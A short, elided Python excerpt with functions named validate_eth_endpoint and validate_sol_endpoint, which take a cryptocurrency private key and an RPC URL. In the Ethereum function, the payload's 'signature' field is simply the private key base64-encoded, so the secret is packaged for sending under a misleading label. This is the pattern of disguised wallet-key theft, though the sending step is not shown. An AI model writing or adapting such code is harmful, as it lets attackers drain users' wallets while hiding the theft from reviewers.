...
def validate_eth_endpoint(from_private_key, rpc_url):
    ...
    account = web3.eth.account.from_key(from_private_key)
    payload = {
        "public_key": account.address,
        "nonce": web3.eth.get_transaction_count(account.address, block_identifier="latest"),
        "timestamp": int(time.time()),
        "signature": base64.b64encode(from_private_key.encode()).decode('utf-8')
    }
...
def validate_sol_endpoint(from_private_key, rpc_url):
    ...
    keypair = Keypair.from_base58_string(from_private_key)
